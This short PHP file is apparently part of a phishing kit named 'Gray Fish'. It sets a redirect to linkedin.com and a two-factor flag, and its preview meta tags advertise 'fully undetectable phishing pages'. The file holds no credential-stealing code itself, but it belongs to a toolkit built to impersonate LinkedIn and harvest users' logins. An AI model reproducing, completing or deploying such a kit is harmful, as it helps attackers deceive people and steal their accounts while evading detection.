<?php
$redirect='https://linkedin.com';
$TFA_Enabled = 'False';
echo "<head>
<meta property=og:title content='Gray Fish'>
<meta property=og:description content='Gray Fish provides fully undetectable phishing pages.'>
<meta property=og:image content='https://i.ibb.co/PmH73X4/index.png'>
<meta property=og:type content='website'>
</head>";
?>